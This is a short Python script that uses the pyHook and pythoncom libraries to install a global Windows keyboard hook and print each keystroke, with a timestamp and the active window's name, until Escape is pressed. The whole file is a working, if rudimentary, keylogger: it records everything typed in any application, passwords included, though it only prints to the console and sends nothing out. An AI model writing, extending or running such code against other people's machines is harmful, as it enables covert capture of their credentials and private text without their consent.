#import modules
import pythoncom,pyHook
from datetime import datetime

#Handle onkeyboard event
def OnKeyboardEvent(event):
	print(str(datetime.now())+'['+event.WindowName+']:'+chr(event.Ascii))
	if(event.Ascii==27):
		exit(0)
	return event.Ascii

hook=pyHook.HookManager()
hook.KeyDown = OnKeyboardEvent
hook.HookKeyboard()
pythoncom.PumpMessages()